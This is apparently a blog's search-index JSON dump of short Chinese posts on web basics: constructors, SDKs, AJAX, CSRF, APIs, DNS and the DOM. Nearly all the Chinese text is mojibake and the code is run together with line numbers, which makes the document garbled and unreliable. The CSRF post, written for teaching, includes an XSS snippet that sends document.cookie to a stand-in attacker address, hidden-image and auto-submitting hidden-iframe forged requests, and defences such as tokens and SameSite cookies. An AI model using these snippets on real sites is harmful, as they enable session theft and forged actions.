12345678910111213141516171819202122function Person(name, age) { this.name = name this.age = age}Person.prototype.log = function () { console.log(this.name + ', ' + this.age)}function newInstance(Constructor, arguments) { const obj = {} // åŸ·è¡Œ Constructorï¼Œä¸¦æŠŠ this æŒ‡å‘ obj Constructor.apply(obj, arguments) // è¨­å®š __proto__ å°æ‡‰åˆ°å“ªå€‹ prototype obj.__proto__ = Constructor.prototype // å›å‚³ instance return obj}// å› ç‚ºæ˜¯ apply æ‰€ä»¥åƒæ•¸è¦ç”¨é™£åˆ—ä¾†å‚³å…¥const peanu = newInstance(Person, ['peanu', 23])// peanu, 23peanu.log()","link":"/2022/03/18/what-does-new-doing/"},{"title":"SDK èˆ‡ API ä¹‹é–“çš„é—œä¿‚","text":"çŸ¥é“ä¸€ä¸‹å°±å¥½ ç°¡å–®ä¾†èªªSDK ï¼ˆSoftware development kitï¼‰è»Ÿé«”é–‹ç™¼å¥—ä»¶ å¯ä»¥æƒ³æˆæ˜¯ä¸€å€‹å¯«å¥½çš„ libraryï¼Œè£¡é¢å¯èƒ½æœƒå¹«ä½ æŠŠ API åŒ…è£èµ·ä¾†ï¼Œè¦ç”¨çš„æ™‚å€™æ¯”è¼ƒç°¡å–®ã€‚ ä»¥ twitter ç‚ºä¾‹ï¼Œå‡è¨­è¦å­˜å–æŸç­†è³‡æ–™ï¼ŒåŸæœ¬å¯èƒ½æ˜¯ï¼š 1GET https://api.twitter.com/1.1/statuss/home_timeline.json è®Šæˆ SDK çš„è©±åªè¦ï¼š 1twitter.getTimeline() å°±æ˜¯æ¯”è¼ƒæ–¹ä¾¿è€Œå·²å•¦ï¼","link":"/2022/01/04/what-is-SDK/"},{"title":"ä»€éº¼æ˜¯ AJAXï¼Ÿ","text":"è¦ºå¾—å¯«å¾—é‚„ä¸éŒ¯æ‰€ä»¥å­˜ä¸€ä¸‹ã€‚ï¼ˆè‡ªè‚¥ï¼Ÿï¼‰ ç°¡è¿°æˆ‘ä¸€ç›´è¦ºå¾—é€™åå­—å¿µèµ·ä¾†å¾ˆé¥’å£ï¼šAsynchronous JavaScript and XMLï¼ŒAJAXï¼ˆéåŒæ­¥çš„ JavaScript èˆ‡ XMLï¼‰ã€‚ ç°¡å–®ä¾†èªªå°±æ˜¯åˆ©ç”¨ JavaScript ä¸­çš„ã€ŒéåŒæ­¥ã€è¡Œç‚ºä¾†è·Ÿä¼ºæœå™¨æ‹¿ã€Œè³‡æ–™ã€ã€‚å¦å¤–ä»¥å‰çš„è³‡æ–™æ ¼å¼å¤§å¤šæ˜¯ XML æ‰€ä»¥æœ€å¾Œä¸€å€‹å­—æ‰æœƒæ˜¯ Xï¼ˆXMLï¼‰ã€‚ä¸éç¾åœ¨éƒ½æ˜¯ä»¥ JSON çš„è³‡æ–™ç‚ºä¸»äº†ï¼Œå› æ­¤æ”¹å« AJAJï¼ˆAsynchronous JavaScript and JSONï¼‰èªªä¸å®šæ›´ç¬¦åˆç¾ä»£èƒŒæ™¯ã€‚ æˆ‘è¦ºå¾— AJAX çš„é‡é»å…¶å¯¦æ˜¯æŒ‡ã€ŒéåŒæ­¥ã€çš„è§€å¿µï¼Œå› ç‚ºå°±ç®—ä¸ç”¨ AJAX é€™å€‹ã€ŒæŠ€è¡“ã€ï¼Œä½ ä¸€æ¨£èƒ½è·Ÿä¼ºæœå™¨æ‹¿è³‡æ–™ï¼Œåªæ˜¯ä½¿ç”¨è€…é«”é©—æœƒä¸å¥½ç½·äº†ã€‚ åŒæ­¥èˆ‡éåŒæ­¥åˆ°åº•éåŒæ­¥æ˜¯ä»€éº¼ï¼Ÿå¾ˆç°¡å–®ï¼Œç›´æ¥èˆ‰ä¾‹ï¼š 123console.log('yo')for (let i = 0; i &lt;= 1000000000; i++) {}console.log('so long~') å‡ºä¾†çš„é †åºæ˜¯ï¼šyo -&gt; ï¼ˆç­‰è¿´åœˆå¤§æ¦‚ä¸€ç§’ï¼‰ -&gt; so long~ é€™å€‹ã€Œç­‰ã€ä¸€è¡Œè·‘å®Œæ‰å¾€ä¸‹åŸ·è¡Œçš„è¡Œç‚ºå°±å«åšç‚ºã€ŒåŒæ­¥ã€ã€‚ å†ä¾†çœ‹ä¸€æ®µï¼š 123console.log('yo')setTimeout(() =&gt; console.log(\"I'm async\"), 1000)console.log('so fast') å‡ºä¾†çš„é †åºæ˜¯ï¼šyo -&gt; so fast -&gt; I'm async é€™é‚Šåœ¨åŸ·è¡Œåˆ°ç¬¬äºŒè¡Œçš„æ™‚å€™å°±ã€Œä¸ç­‰äº†ã€ï¼Œç¹¼çºŒå¾€ä¸‹åŸ·è¡Œçš„è¡Œç‚ºå°±å«åšã€ŒéåŒæ­¥ã€ã€‚ AJAX è¦çš„å°±æ˜¯é€™å€‹ã€ŒéåŒæ­¥ã€çš„è¡Œç‚ºï¼Œå› ç‚ºæˆ‘å€‘ä¸å¸Œæœ›åœ¨è·Ÿä¼ºæœå™¨æ‹¿è³‡æ–™æ™‚ä½ çš„ç¨‹å¼å¡åœ¨é‚£é‚Šç­‰ responseã€‚ä½ æƒ³æƒ³çœ‹å¦‚æœè¦ç­‰çš„è©±ä½¿ç”¨è€…é«”é©—æœ‰å¤šç³Ÿï¼Ÿ 12345678910111213141516171819202122232425262728293031323334function getData(callback) { const xhr = new XMLHttpRequest() /* æ³¨æ„é€™é‚Šçš„æœ€å¾Œä¸€å€‹åƒæ•¸ async æ˜¯ falseï¼Œ ä»£è¡¨æˆ‘è¦è®“é€™æ®µ request æ˜¯ã€ŒåŒæ­¥ã€åŸ·è¡Œ*/ xhr.open('GET', 'https://gorest.co.in/public/v1/users', false) xhr.onload = () =&gt; { if (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 400) { callback(null, xhr.responseText) } else { callback('error!') } } xhr.send()}// é»æŒ‰éˆ•å°±é¡¯ç¤º clickconst button = document.querySelector('button')button.onclick = () =&gt; console.log('click')// è·Ÿä¼ºæœå™¨æ‹¿è³‡æ–™ï¼Œé€™é‚Šå› ç‚ºè¨­å®šæˆåŒæ­¥ï¼Œæ‰€ä»¥æœƒã€Œå¡åœ¨é€™è£¡ç­‰ã€getData((err, data) =&gt; { if (err) { console.log(err) } else { console.log(data) }})// æ‰‹å‹•å¤ªæ…¢äº†ï¼Œæ‰€ä»¥ç”¨ç¨‹å¼ä¾†é» 10 ä¸‹æŒ‰éˆ•for (let i = 0; i &lt; 10; i++) { button.click()} ä½ æ‹¿å»è·‘è·‘çœ‹å°±çŸ¥é“ï¼ˆè¨˜å¾—è¦å…ˆå¯«å¥½ HTML çš„ &lt;button&gt;ï¼‰ï¼Œä¸ç®¡é‡æ–°æ•´ç†å¹¾æ¬¡ click éƒ½æœƒåœ¨ã€Œæ‹¿åˆ° response ä¹‹å¾Œã€æ‰åŸ·è¡Œã€‚ç‚ºä»€éº¼ï¼Ÿå› ç‚ºæˆ‘è®“å®ƒè®ŠæˆåŒæ­¥ï¼Œæ‰€ä»¥é€™ä»£è¡¨åœ¨æ‹¿åˆ° response ä¹‹å‰å®Œå…¨ä¸èƒ½åšä»»ä½•äº‹ã€‚ ä»¥ä¸Šå°±æ˜¯åŒæ­¥è·ŸéåŒæ­¥çš„å·®åˆ¥ã€‚","link":"/2022/01/29/what-is-ajax/"},{"title":"èªè­˜ CSRF","text":"çµæœé‚„æ˜¯ä¾†å¡«å‘äº†ã€‚ ç°¡è¿°æœ¬ä¾†æ˜¯æ²’æ‰“ç®—å¯«é€™ç¯‡çš„ï¼Œä½†é€™å€‹æ”»æ“Šæ–¹å¼å°æ–¼è³‡å®‰ä¾†èªªä¼¼ä¹é‚„è »é‡è¦çš„ï¼Œå› æ­¤é‚„æ˜¯ä¾†è¨˜éŒ„ä¸€ä¸‹å¥½äº†ã€‚ CSRFï¼ˆCross Site Request Forgeryï¼‰è·¨ç¶²ç«™å½é€ è«‹æ±‚ã€‚æ˜¯ä¸€ç¨®æ”»æ“Šæ–¹å¼ï¼Œä½†è¦ç‰¹åˆ¥æ³¨æ„å®ƒå’Œ XSS æ˜¯ä¸ä¸€æ¨£çš„æ±è¥¿ã€‚é€™å…©å€‹å¯ä»¥å–®ç¨ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥åˆåœ¨ä¸€èµ·ç”¨ã€‚ å€åˆ† XSS èˆ‡ CSRF çš„å·®åˆ¥é€™å…©å€‹å¯¦éš›ä¸Šåˆ°åº•å·®åœ¨å“ªè£¡ï¼Ÿæˆ‘æ˜¯é€™æ¨£æƒ³çš„ï¼šXSS çš„æ¬ºé¨™å°è±¡æ˜¯ä½¿ç”¨è€…ï¼ŒCSRF çš„æ¬ºé¨™å°è±¡æ˜¯ä¼ºæœå™¨ã€‚ XSS æ˜¯ä½ åˆ°ä¸€å€‹ä½ ä»¥ç‚ºå®‰å…¨çš„ç¶²ç«™ï¼Œä½†å¯¦éš›ä¸Šä¸æ˜¯ï¼Œé€™å€‹ç¶²ç«™å¯èƒ½å·²ç¶“è¢« XSS æ³¨å…¥ï¼š 12345678910// é§­å®¢æƒ³è¦é€åˆ°çš„åœ°æ–¹let address = 'http://localhost:5000'// å»ºç«‹ &lt;img&gt;let img = document.createElement('img')// å­˜å– cookie çš„ä»£ç¢¼let cookie = document.cookie// è¨­å®š &lt;img src=\"http://localhost:5000?cookie=value\"&gt;img.setAttribute('src', `${address}/?cookie=${encodeURIComponent(cookie)}`)// æ’åˆ° DOM è£¡é¢document.body.appendChild(img) æ‰€ä»¥é§­å®¢å°±é€™æ¨£é¨™èµ°äº†ä½ ï¼ˆä½¿ç”¨è€…ï¼‰çš„ Cookieã€‚ CSRF æ˜¯é€éã€Œå½é€ çš„èº«åˆ†ï¼ˆé€šå¸¸æ˜¯ session idï¼‰ã€ä¾†ç™¼å‡ºå‡çš„ request çµ¦ä¼ºæœå™¨ã€‚ä¾‹å¦‚æœ‰å€‹æƒ¡æ„ç¶²ç«™ï¼š 12&lt;img src=\"http://localhost/peanu/real-blog/handle_admin_delete_post.php?id=92\" width=\"0\" height=\"0\" /&gt;&lt;a href=\"#\"&gt;é»æˆ‘ç™¼å¤§è²¡&lt;/a&gt; ä¸Šé¢ &lt;img&gt; çš„é€£çµæ˜¯ã€Œåˆªé™¤æŸç¯‡æ–‡ç« ã€çš„ requestã€‚ ä¸€èˆ¬ä¾†èªªï¼Œåˆªé™¤æ–‡ç« å¿…é ˆè¦æœ‰ç®¡ç†å“¡çš„æ¬Šé™ï¼Œæ‰€ä»¥ server æœƒå…ˆæª¢æŸ¥ session id æ˜¯å¦ç¬¦åˆæ‰åˆ¤æ–·è¦ä¸è¦åŸ·è¡Œã€‚ä½†æ˜¯ç•¶ç®¡ç†å“¡æ˜¯åœ¨å·²ç¶“ç™»å…¥æˆåŠŸçš„æƒ…æ³ä¸‹ä¾†åˆ°ä¸Šé¢çš„æƒ¡æ„ç¶²ç«™å‘¢ï¼Ÿ é€™æ™‚å€™ server å°±æœƒä»¥ç‚ºé€™å€‹ request æ˜¯ç®¡ç†å“¡ç™¼çš„ï¼ˆå› ç‚ºç€è¦½å™¨çš„æ©Ÿåˆ¶æ˜¯åªè¦åˆ°äº†æŸå€‹ç¶²åŸŸï¼Œå°±æœƒè‡ªå‹•å¸¶ä¸Š cookieï¼Œè€Œ cookie å­˜çš„å°±æ˜¯ session idï¼‰ï¼Œæ‰€ä»¥å°±çœŸçš„æŠŠæ–‡ç« åˆªé™¤äº†ã€‚ æ‰€ä»¥é€™å°±æ˜¯é€™å…©å€‹æœ€å¤§çš„å·®ç•°ï¼Œæˆ‘è¦ºå¾—å•¦ã€‚ å¯¦éš›ç¤ºç¯„ CSRFé€™é‚Šæ‹¿æˆ‘åšçš„éƒ¨è½æ ¼ä¾†å¯¦é©—ï¼Œå‡è¨­æœ‰å€‹æƒ¡æ„ç¶²ç«™å…§å®¹é•·é€™æ¨£ï¼š 1234// åˆªé™¤æ–‡ç« çš„é€£çµ&lt;img src=\"http://localhost/peanu/real-blog/handle_admin_delete_post.php?id=96\" width=\"0\" height=\"0\" /&gt;// éšœçœ¼æ³•&lt;a href=\"#\"&gt;é»æˆ‘ç™¼å¤§è²¡&lt;/a&gt; çµæœå°±æœƒåƒé€™æ¨£ï¼š ç°¡å–®è§£é‡‹ä¸€ä¸‹æµç¨‹ï¼š ä½¿ç”¨è€…è™•æ–¼ç™»å…¥ç‹€æ…‹ æ‰“é–‹æƒ¡æ„ç¶²ç«™ æƒ¡æ„ç¶²ç«™åˆ©ç”¨ GET ç™¼è«‹æ±‚åˆ° handle_admin_delete_post.php?id=96 åˆªé™¤ id=96 çš„æ–‡ç« ã€‚ é€™å°±æ˜¯ CSRF å¯æ€•çš„åœ°æ–¹ï¼ˆCross Siteï¼‰ï¼Œä½ å¯ä»¥åœ¨åˆ¥çš„åœ°æ–¹å° server ç™¼å‡º requestï¼Œè€Œ server é‚„çœŸçš„æœƒä¹–ä¹–ç…§ä½ èªªçš„åšã€‚ é€™è£¡ä¹‹æ‰€ä»¥èƒ½ç”¨ &lt;img&gt; æˆ– &lt;a&gt; ä¾†ç™¼ request æ˜¯å› ç‚ºåˆªé™¤æ–‡ç« ç”¨çš„æ˜¯ GETã€‚ä½†å¦‚æœæ”¹æˆ POST å‘¢ï¼Ÿ é€™é‚Šç›´æ¥ç¯€éŒ„ è®“æˆ‘å€‘ä¾†è«‡è«‡ CSRF çš„ç¯„ä¾‹ã€‚ æ”¹æˆç”¨ Form è¡¨å–® POSTï¼Œé€™æ¨£å°±ä¸èƒ½ç”¨ &lt;img&gt; &lt;a&gt; ä¾†å½é€ ï¼š 1234&lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"id\" value=\"3\" /&gt; &lt;input type=\"submit\" value=\"ç™¼å¤§è²¡\" /&gt;&lt;/form&gt; ä¸€æ¨£æ˜¯ CSRFï¼Œä½†ç¾åœ¨é é¢æœƒè·³è½‰ï¼Œä½¿ç”¨è€…æœƒç™¼ç¾æ€ªæ€ªçš„ã€‚ å¯æ˜¯é§­å®¢éå¸¸æœ‰æƒ³åƒåŠ›ï¼Œå®ƒé‚„æ˜¯æœ‰è¾¦æ³•è®“ä½¿ç”¨è€…ä¸è¦å¯Ÿè¦ºï¼š 1234567891011&lt;!-- çœ‹ä¸åˆ°çš„ iframe --&gt;&lt;iframe style=\"display:none\" name=\"csrf-frame\"&gt;&lt;/iframe&gt;&lt;!-- åœ¨é€™é‚ŠæŒ‡å®š targetï¼Œå°±åªæœ‰ iframe è£¡çš„é é¢æœƒè·³è½‰ --&gt;&lt;form method=\"POST\" action=\"https://small-min.blog.com/delete\" target=\"csrf-frame\" id=\"csrf-form\"&gt; &lt;input type=\"hidden\" name=\"id\" value=\"3\" /&gt; &lt;input type=\"submit\" value=\"submit\" /&gt;&lt;/form&gt;&lt;!-- é †ä¾¿ç”¨ JS ç›´æ¥é€å‡ºè¡¨å–®ï¼Œä½¿ç”¨è€…é€£é»ä¸ç”¨é» --&gt;&lt;script&gt; document.getElementById('csrf-form').submit()&lt;/script&gt; æ‰€ä»¥æˆ‘å¸¸èªªç•¶é§­å®¢é™¤äº†è¦æ‡‚ç¨‹å¼ä»¥å¤–ï¼Œé‚„è¦éå¸¸æœ‰å‰µæ„ï¼ŒçœŸçš„å¤ªé©šå–œäº†ã€‚ é˜²ç¯„æ–¹å¼ç¸½ä¹‹å‘¢ï¼ŒCSRF çš„æ”»æ“Šæ‰‹æ³•é‚„è »å¤šçš„ï¼Œè©³ç´°å¯ä»¥åƒè€ƒ è®“æˆ‘å€‘ä¾†è«‡è«‡ CSRFï¼Œè£¡é¢å¯«çš„å¾ˆè©³ç´°ã€‚ è‡³æ–¼è¦æ€éº¼é˜²ç¯„å‘¢ï¼Ÿå¯ä»¥å…ˆæ€è€ƒä¸€ä¸‹ CSRF æ˜¯æ€éº¼æˆç«‹çš„ã€‚ CSRF æœ€å¤§çš„æ¼æ´åœ¨æ–¼ server åªæª¢æŸ¥ cookie çš„ session_idï¼Œä½†æ²’æœ‰æª¢æŸ¥ request æ˜¯å¾å“ªè£¡ç™¼éä¾†çš„ã€‚ æ‰€ä»¥æœ‰å¹¾ç¨®åšæ³•ï¼š æª¢æŸ¥ Referer é€šå¸¸ request header éƒ½æœƒæœ‰å€‹ refer æ¬„ä½ï¼Œå‘Šè¨´ä½  request æ˜¯å¾å“ªè£¡ç™¼ä¾†çš„ã€‚ä¸éé€™å€‹æ–¹æ³•ä¸å¤ªé è­œï¼š ä¸æ˜¯æ‰€æœ‰ç€è¦½å™¨éƒ½æœƒå¸¶ä¸Š refer ä½¿ç”¨è€…å¯èƒ½è‡ªå·±é—œæ‰ refer åŠŸèƒ½ï¼ˆé€™æ¨£é€£è‡ªå·±éƒ½è¢«æ“‹æ‰ï¼‰ åˆ¤æ–· refer çš„é‚è¼¯æ²’å¯«å¥½å°±æœƒ GG åœ–å½¢é©—è­‰ç¢¼ã€ç°¡è¨Šé©—è­‰ç¢¼ é€™å€‹åšæ³•è »é è­œçš„ï¼Œä½†å•é¡Œæ˜¯ä½¿ç”¨é«”é©—å¾ˆå·®ï¼ˆæ¯æ¬¡åˆªæ–‡ç« éƒ½è¦åšé©—è­‰ï¼‰ åŠ ä¸Š CSRF token å¤§æ¦‚æ˜¯åƒé€™æ¨£ï¼š 123456&lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"id\" value=\"3\" /&gt; &lt;!-- é€™å€‹ token ç”± server ç”¢ç”Ÿ --&gt; &lt;input type=\"hidden\" name=\"csrftoken\" value=\"fj1iro2jro12ijoi1\" /&gt; &lt;input type=\"submit\" value=\"åˆªé™¤æ–‡ç« \" /&gt;&lt;/form&gt; ï¼ˆsever è‡ªå·±é‚£é‚Šä¹Ÿè¦å­˜ä¸€å€‹å°æ‡‰çš„ tokenï¼‰ é€™æ¨£å­å°±å¾—å…ˆçŸ¥é“ token æ˜¯ fj1iro2jro12ijoi1 æ‰æœ‰è¾¦æ³•é€šé server çš„é©—è­‰ï¼Œä¸éå•é¡Œæ˜¯å¦‚æœæœ‰é–‹ CROS çš„è©±å°±æœƒç ´åŠŸï¼š åˆ©ç”¨ç®¡ç†å“¡çš„ç™»å…¥ç‹€æ…‹ç™¼ AJAX åˆ° admin_post.php å–å¾— token åœ¨ç”¨ AJAX ç™¼ POST å¸¶ä¸Š id å’Œ token é¨™é server ï¼ˆä¸ç¢ºå®šå¯«å¾—å°ä¸å°ï¼Œä½†æˆ‘çŒœæ˜¯é€™æ¨£ï¼‰ ç”¨ç€è¦½å™¨æä¾›çš„åŠŸèƒ½ä¾†è¨­å®š cookie SameSiteï¼ˆæ¨è–¦ï¼‰ ç°¡å–®ä¾†èªªåªè¦æ˜¯è·¨ Domain çš„ request ä¸€å¾‹æ“‹æ‰ã€‚åœ¨ PHP å¯ä»¥é€™æ¨£è¨­å®šï¼š 12345678910111213141516171819// è¨­å®š session çš„éƒ¨åˆ†session_set_cookie_params([ 'lifetime' =&gt; 3600, 'path' =&gt; '/peanu/real-blog/', 'domain' =&gt; 'localhost', 'secure' =&gt; TRUE, 'httponly' =&gt; TRUE, 'samesite' =&gt; 'Lax']);// è¨­å®š cookie çš„éƒ¨åˆ†setcookie('test', 'test', [ 'expires' =&gt; time() + 86400, 'path' =&gt; '/peanu/real-blog/', 'domain' =&gt; 'localhost', 'secure' =&gt; TRUE, 'httponly' =&gt; TRUE, 'samesite' =&gt; 'Lax',]); é€™è£¡åšå€‹è£œå……ï¼Œå¦‚æœä½ è¦ç¢ºä¿ cookie ä¾ç…§ä¸Šé¢ä¾†è¨­å®šï¼Œæœ€å¥½æ˜¯åœ¨æ‰€æœ‰æœƒç”¨åˆ° session_start() çš„é é¢åšç›¸åŒçš„è¨­å®šï¼Œæ‰ä¸æœƒå‡ºç¾æ¼ç¶²ä¹‹é­šã€‚ï¼ˆæˆ–ä¹Ÿèƒ½æ‹†å‡ºä¾†å¯«æˆä¸€å€‹ session.php ä¹‹é¡çš„ï¼‰ é€™éƒ¨åˆ†æˆ‘ä¸å¤ªçŸ¥é“æ€éº¼å¯¦ä½œï¼Œæ‰€ä»¥åªè²¼è¨­å®šå¥½çš„åœ–ç‰‡çµ¦ä½ çœ‹ï¼š è‡³æ–¼ samesite æœ‰å…©å€‹è¨­å®šå€¼ï¼š Strict åœ¨ Domain ç¯„åœå…§çš„ request æ‰å¸¶ä¸Š cookieï¼ˆè¦è²¼ç™»å…¥ç‹€æ…‹çš„æ±è¥¿çµ¦åˆ¥äººæ™‚ä¸æ–¹ä¾¿ï¼‰ Lax æ¯”è¼ƒå¯¬é¬†ä¸€é»ï¼Œ GET æœƒå¸¶ cookieï¼Œä½†å…¶ä»–åƒ POST, PUT, DELETE å°±ä¸å¸¶ï¼ˆä½†é€™æ¨£å°±æ“‹ä¸äº† GET çš„ CSRFï¼‰ ä»¥ä¸Šã€‚é›–ç„¶é‚„æ²’å®Œå…¨å¼„æ‡‚ï¼Œä½†å°±å…ˆé€™æ¨£å­å§ã€‚","link":"/2022/02/22/what-is-csrf/"},{"title":"ä½ è¦ºå¾—ä»€éº¼æ˜¯ APIï¼Ÿ","text":"æˆ‘æ˜¯é€™æ¨£æƒ³çš„ã€‚ æˆ‘èªç‚ºæœ€å¥½çš„è§£é‡‹æˆ‘çœ‹éå„ç¨® API çš„è§£é‡‹ï¼Œæœ‰äººèªªæ˜¯ã€Œé›™æ–¹æºé€šçš„åª’ä»‹ã€ï¼Œæœ‰äººèªªæ˜¯ã€Œä¸€å€‹æ“ä½œçš„ä»‹é¢ã€ï¼Œæœ‰äººèªªæ˜¯ã€Œå‡½å¼åº«ã€ç­‰ç­‰ï¼Œè€Œæˆ‘è‡ªå·±è¦ºå¾—èªç‚ºæœ€å¥½ç†è§£çš„ä¸€å¥è©±æ˜¯ ã€Œç¨‹å¼èˆ‡ç¨‹å¼ä¹‹é–“æºé€šçš„ä»‹é¢ã€ã€‚ é€™å€‹æƒ³æ³•æ˜¯æˆ‘åœ¨ Javascript &amp; jQuery: Interactive Front-End Web Development è£¡å­¸åˆ°çš„ï¼Œé€™æœ¬æ›¸è£¡é¢è§£é‡‹ API çš„æ–¹å¼å¾ˆç°¡å–®ã€‚ è©¦è‘—æƒ³æƒ³çœ‹ä½ åœ¨ç€è¦½ç¶²é çš„æ™‚å€™ï¼Œæ˜¯ä¸æ˜¯å……æ»¿äº†å„ç¨®å…ƒç´ å¯ä»¥è®“ä½ å»è·Ÿä»–äº’å‹•ï¼Ÿä¾‹å¦‚èªªã€Œæ»‘é¼ ç§»éå»çš„æ™‚å€™æœ‰æ±è¥¿æœ‰åæ‡‰ã€æˆ–æ˜¯ã€Œé»ä¸‹ â‰¡ çš„æ™‚å€™å°±æœƒå½ˆä¸€å€‹æ±è¥¿å‡ºä¾†ã€ã€‚ é€™å€‹å«åšã€Œä½¿ç”¨è€…ä»‹é¢ï¼ˆUser interface designï¼ŒUIï¼‰ã€ï¼Œä½ å¿…é ˆé€éé€™å€‹ä»‹é¢æ‰èƒ½è·Ÿç¶²é åšäº’å‹•ï¼Œå¦‚æœæ²’æœ‰é€™å€‹ä»‹é¢ï¼Œå°±ä»€éº¼éƒ½åšä¸äº†ï¼ˆé™¤éä½ ç›´æ¥å¯«ç¨‹å¼ç¢¼ä¾†æ“ä½œï¼‰ã€‚ è€Œ API ä¹Ÿæ˜¯åŒæ¨£çš„é“ç†ï¼Œåªæ˜¯å®ƒæ˜¯ ã€Œå·¥ç¨‹å¸«è¨­è¨ˆçµ¦å·¥ç¨‹å¸«æ“ä½œçš„ã€ä»‹é¢ã€ã€ã€‚ å…©è€…ä¸åŒçš„åœ°æ–¹åœ¨æ–¼ï¼ŒUI æ˜¯é€éã€Œç¡¬é«”è¨­å‚™ï¼ˆéµç›¤ã€æ»‘é¼ ï¼‰ã€ä¾†è·Ÿä»‹é¢åšæºé€šï¼ŒAPI æ˜¯å‰‡é€éã€Œç¨‹å¼ç¢¼ã€ä¾†è·Ÿä»‹é¢åšæºé€šï¼Œå…¶å¯¦èªªç©¿äº†éƒ½æ˜¯åœ¨ä½¿ç”¨ã€Œè¢«è¨­è¨ˆå¥½çš„ä¸€å€‹ä»‹é¢ã€ï¼Œåªæ˜¯ä½¿ç”¨çš„æ–¹æ³•ä¸åŒè€Œå·²ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œå·¥ç¨‹å¸«è¨­è¨ˆäº†ä¸€å€‹ä»‹é¢ï¼ˆä¾‹å¦‚ â‰¡ï¼‰ï¼Œè®“ä½¿ç”¨è€…åœ¨æ»‘é¼ é»ä¸‹å»çš„æ™‚å€™æœƒå½ˆå‡ºæ±è¥¿ä¾†ï¼Œå°æ‡‰åˆ° API çš„è©±å°±æœƒæ˜¯å¾Œç«¯å·¥ç¨‹å¸«è¨­è¨ˆäº†ä¸€å€‹ä»‹é¢ï¼ˆä¾‹å¦‚ä¸€å€‹ functionï¼‰ï¼Œè®“å‰ç«¯å·¥ç¨‹å¸«ç”¨ç¨‹å¼ç¢¼ä¾† call é€™å€‹ function çš„æ™‚å€™å¯ä»¥æ‹¿åˆ°è³‡æ–™ï¼Œæˆ–æ˜¯åŸ·è¡ŒæŸå€‹åŠŸèƒ½ã€‚ ç„¶è€Œè¦æ€éº¼ã€Œè¨­è¨ˆã€è·Ÿã€Œä½¿ç”¨ã€ä¸€å€‹ä»‹é¢ï¼Œå…¶å¯¦éƒ½æ˜¯é›™æ–¹å¾—äº’ç›¸é”æˆå…±è­˜çš„ã€‚å¦‚æœå·¥ç¨‹å¸«ä¸è¨­è¨ˆä¸€å€‹ â‰¡ ä¾†è®“ä½ å¯ä»¥é»å®ƒï¼Œä½ å°±æ²’è¾¦æ³•åšé€™ä»¶äº‹ï¼ŒåŒç†ï¼Œå¦‚æœå·¥ç¨‹å¸«ä¸è¨­è¨ˆä¸€å€‹ functionï¼Œæˆ‘å°±æ²’è¾¦æ³• call é€™å€‹ function ä¾†åšæŸä»¶äº‹ã€‚ æ‰€ä»¥ç‚ºä»€éº¼è¦æœ‰ UI æˆ– APIï¼Ÿ ç‚ºäº†è®“é›™æ–¹èƒ½å¤ æœ‰ä¸€å€‹æºé€šçš„ç®¡é“ï¼Œä¹Ÿå°±æ˜¯ã€Œä»‹é¢ã€ å…¶å¯¦åªæ˜¯é€™æ¨£ç°¡å–®çš„é“ç†è€Œå·²ã€‚","link":"/2022/01/07/what-is-api/"},{"title":"ä»€éº¼æ˜¯ DNSï¼Ÿ","text":"è¨€ç°¡æ„è³…ã€‚ æƒ³æƒ³è¨ˆç¨‹è»Šå¸æ©Ÿå¦‚æœä½ æƒ³æ­è¨ˆç¨‹è»Šåˆ°ã€Œé«˜é›„ç«è»Šç«™ã€ï¼Œä½ æ‡‰è©²æœƒè·Ÿå¸æ©Ÿèªªï¼šæˆ‘è¦åˆ°é«˜é›„è»Šç«™ï¼Œè€Œä¸æ˜¯ æˆ‘è¦åˆ°é«˜é›„å¸‚ä¸‰æ°‘å€å»ºåœ‹äºŒè·¯ 318 è™Ÿã€‚ åœ¨ç¶²è·¯çš„ä¸–ç•Œä¹Ÿæ˜¯ä¸€æ¨£çš„ï¼Œä½ å¯ä»¥ç”¨ä»¥ä¸‹å…©ç¨®æ–¹å¼ä¾†é€ è¨ª googleã€‚ æ–¹æ³•ä¸€ï¼š 1https://www.google.com/ æ–¹æ³•äºŒï¼š 1172.217.160.110 å¯¦éš›ä¸ŠèƒŒå¾Œéƒ½æ˜¯ç”¨ç¬¬äºŒç¨®æ–¹å¼ä¾†å¸¶ä½ åˆ° google çš„ï¼Œåªæ˜¯ç¬¬ä¸€ç¨®æ–¹æ³• DNS æœƒå¹«ä½ æŠŠã€ŒåŸŸåã€è½‰æˆã€ŒIP åœ°å€ã€æ‰è®“ä½ ä¹Ÿèƒ½é€ è¨ª googleã€‚ æ‰€ä»¥ DNS å°±æ˜¯å€‹è¨ˆç¨‹è»Šå¸æ©Ÿï¼Œåªè¦è·Ÿä»–èªªåœ°æ¨™ï¼ˆåŸŸåï¼‰ï¼Œä»–å°±çŸ¥é“å¯¦éš›ä½ç½®ï¼ˆIP åœ°å€ï¼‰åœ¨å“ªè£¡äº†ã€‚ nsloolupä½ ä¹Ÿå¯ä»¥ç”¨ CMD çš„ nslookup ä¾†çœ‹ä¸€å€‹åŸŸåå°æ‡‰åˆ°çš„ IP åœ°å€æ˜¯å“ªè£¡ï¼š 1nslookup github.com =&gt; 13.114.40.48","link":"/2022/01/05/what-is-dns/"},{"title":"ä»€éº¼æ˜¯ DOMï¼Ÿ","text":"ç°¡å–®å¿«é€Ÿã€‚ è§£é‡‹å…¨åç‚ºã€Œæ–‡ä»¶ç‰©ä»¶æ¨¡å‹ï¼ˆDocument Object Model, DOMï¼‰ã€ã€‚ æŠŠé‡é»æ”¾åœ¨ Object å°±å¥½ï¼Œå› ç‚º DOM å°±æ˜¯ç”¨ä¾†æŠŠã€ŒDocumentã€ï¼ˆä¾‹å¦‚ HTMLï¼‰è½‰æ›æˆã€ŒObjectã€çš„ä¸€å€‹æ¨¡å‹ï¼š ä¾‹å¦‚æœ‰æ®µ HTMLï¼š 12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;My title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;A heading&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; åœ¨ DOM æ¨¡å‹ä¸­å¤§æ¦‚å°±é•·é€™æ¨£ï¼š 12345678910111213141516171819202122const document = { html: { head: { title: { text: 'My title' } }, body: { h1: { text: 'A heading' } } }, // åœ¨ DOM è£¡å®šç¾©å¥½çš„æ–¹æ³• getElementById: function(id) { ... }, // åœ¨ DOM 